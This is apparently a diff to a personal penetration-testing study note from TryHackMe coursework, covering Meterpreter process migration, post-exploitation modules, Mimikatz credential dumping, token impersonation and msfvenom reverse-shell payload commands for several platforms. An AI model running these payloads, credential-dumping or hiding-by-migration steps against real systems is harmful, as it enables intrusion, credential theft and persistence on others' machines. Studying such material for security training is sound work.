@@ -140,23 +140,6 @@ The Meterpreter reverse shell *requires* a connection back to msfconsole using m
 
 Meterpreter sessions can be backgrounded using the `background` command, and all sessions can be backgrounded using `CTRL + Z`. List sessions using the `sessions` command, and foreground a session using `session -i #`, where `#` is the session number.
 
-I *think* that Meterpreter is being run directly from memory, and what `migrate` is doing is basically creating a new process using the memory of a different application, hopping to that process, and then shutting down the old process.
-
-Reasons to migrate the Meterpreter process:
-
-* For persistence (pick a long-running process)
-* To make sure that the Meterpreter *process* has system privileges
-* To hide (pick a process less likely to be examined)
-* To stabilize the shell (initial exploits often produce somewhat unstable sessions)
-* To move laterally or escalate privileges within a system (if you’re lucky)
-* To gain additional capabilities
-
-In particular, harvesting credentials from LSASS requires that Meterpreter be living in a process with the same permissions (NT AUTHORITY/SYSTEM) and architecture as LSASS; migrating Meterpreter can help us realize this. The print spooler service (`spoolsv.exe`) is often a good choice, as it runs with elevated permissions, has the same architecture as the system itself, and will restart itself automatically. You can also use `lsass.exe` directly if you feel like living dangerously.
-
-Another example is that dumping keystrokes will only work when Meterpreter is attached to a word processor or text editor.
-
-Note that Meterpreter will happily let you migrate from a privileged to an unprivileged process — which may cause you to loose control of the target system! Additionally, migrating Meterpreter will change its current working directory to that of the process it’s attaching to.
-
 ### Modules
 
 Potentially useful Metsploit modules to `run` from/besides Meterpreter:
@@ -164,7 +147,9 @@ Potentially useful Metsploit modules to `run` from/besides Meterpreter:
 * `post/windows/gather/checkvm` — try to determine if we’re in a VM
 * `post/multi/recon/local_exploit_suggester` — find possible privilege escalation exploits (can be slow/unreliably on 64-bit architectures)
 * `post/windows/gather/enum_shares` — enumerate shares
+* `auxiliary/scanner/smb/smb_enumusers_domain` — enumerate SMB domain users (requires existing admin credentials)
 * `post/windows/gather/hashdump` — same as the hashdump command, but pushes the hashes into the Metasploit DB
+* `post/windows/gather/smart_hashdump GETSYSTEM=FALSE` — same as the hashdump command, but pushes the hashes into the Metasploit DB and ignores system accounts
 * `auxiliary/analyze/crack_windows` — sic John the Ripper or Hashcat on NTLM hashes stored in the Metasploit DB
 * `post/windows/manage/enable_rdp` — enable RDP access (requires admin privileges)
 * `post/multi/manage/autoroute` — manipulate target routing for pivoting
@@ -185,6 +170,49 @@ powershell_shell
 ```
 
 *Don’t* try to exit PowerShell — trying to do this produces consistent hangs for me. Instead, background the process with `^Z`.
+
+### Using Mimikatz
+
+Use `load kiwi` to load up Mimikatz. Sub-commands:
+
+```meterpreter
+kerberos         # Attempt to retrieve kerberos creds
+livessp          # Attempt to retrieve livessp creds
+mimikatz_command # Run a custom commannd
+msv              # Attempt to retrieve msv creds (hashes)
+ssp              # Attempt to retrieve ssp creds
+tspkg            # Attempt to retrieve tspkg creds
+wdigest          # Attempt to retrieve wdigest creds
+```
+
+### Log In as a User
+
+```meterpreter
+load incognito
+list_tokens -u
+impersonate_token $DOMAIN\\$USER
+```
+
+Not 100% sure where the “tokens” come from here… Mimikatz, maybe?
+
+### Process Migration
+
+I *think* that Meterpreter is being run directly from memory, and what `migrate` is doing is basically creating a new process using the memory of a different application, hopping to that process, and then shutting down the old process.
+
+Reasons to migrate the Meterpreter process:
+
+* For persistence (pick a long-running process)
+* To make sure that the Meterpreter *process* has system privileges
+* To hide (pick a process less likely to be examined)
+* To stabilize the shell (initial exploits often produce somewhat unstable sessions)
+* To move laterally or escalate privileges within a system (if you’re lucky)
+* To gain additional capabilities
+
+In particular, harvesting credentials from LSASS requires that Meterpreter be living in a process with the same permissions (NT AUTHORITY/SYSTEM) and architecture as LSASS; migrating Meterpreter can help us realize this. The print spooler service (`spoolsv.exe`) is often a good choice, as it runs with elevated permissions, has the same architecture as the system itself, and will restart itself automatically. You can also use `lsass.exe` directly if you feel like living dangerously.
+
+Another example is that dumping keystrokes will only work when Meterpreter is attached to a word processor or text editor.
+
+Note that Meterpreter will happily let you migrate from a privileged to an unprivileged process — which may cause you to loose control of the target system! Additionally, migrating Meterpreter will change its current working directory to that of the process it’s attaching to.
 
 ## Venom (“msfvenom”)
 
@@ -224,7 +252,12 @@ Use `--list formats` to see available encoding formats.
 msfvenom -p linux/x86/meterpreter/reverse_tcp \
 LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f elf > rev_shell
 
-# 32-bit Windows executable Meterpreter payload
+# 32-bit macOS MACH-O Meterpreter payload
+#
+msfvenom -p osx/x86/shell_reverse_tcp \
+LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f macho > rev_shell
+
+# 32-bit (?) Windows executable Meterpreter payload
 #
 msfvenom -p windows/meterpreter/reverse_tcp \
 LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f exe > rev_shell.exe
@@ -239,11 +272,28 @@ LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f raw > rev_shell.php
 msfvenom -p windows/meterpreter/reverse_tcp \
 LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f asp > rev_shell.asp
 
+# JSP Meterpreter payload
+#
+msfvenom -p java/jsp_shell_reverse_tcp \
+LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f raw > rev_shell.jsp
+
 # Python Meterpreter payload
 #
 msfvenom -p cmd/unix/reverse_python \
 LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f raw > rev_shell.py
+
+# Bash Meterpreter payload
+#
+msfvenom -p cmd/unix/reverse_bash \
+LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f raw > rev_shell.sh
+
+# Perl Meterpreter payload
+#
+msfvenom -p cmd/unix/reverse_perl \
+LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f raw > rev_shell.pl
 ```
+
+System-specific shell codes can also be produced by appropriately varying the `-f` option.
 
 ### 32-Bit Windows Programs
 
@@ -305,3 +355,4 @@ Use the `exploit/multi/handler` module in Metasploit to catch the shells produce
 * [2022-04-18 - ITPro.TV: CompTIA Security+ (SY0-601) & TryHackMe: Jr. Penetration Tester](../log/2022-04-18-itprotv-comptia-security-plus-and-tryhackme-jr-penetration-tester.md)
 * [Using Mimikatz](mimikatz.md)
 * [2022-04-21 - TryHackMe: Jr. Penetration Tester](../log/2022-04-21-tryhackme-jr-penetration-tester.md)
+* [slyth11907 / Cheatsheets](https://github.com/slyth11907/Cheatsheets)
